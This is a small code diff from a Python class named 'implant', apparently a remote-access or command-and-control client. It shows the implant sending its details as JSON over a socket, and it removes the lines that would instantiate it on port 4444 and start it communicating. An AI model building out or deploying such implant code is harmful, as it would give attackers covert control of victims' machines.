@@ -37,7 +37,3 @@ class implant:
         }
         self.sock.send(json.dumps(self.implant_info).encode())
 
-my_implant = implant("0.0.0.0", 4444)
-my_implant.connect()
-my_implant.intro()
-my_implant.communicate()
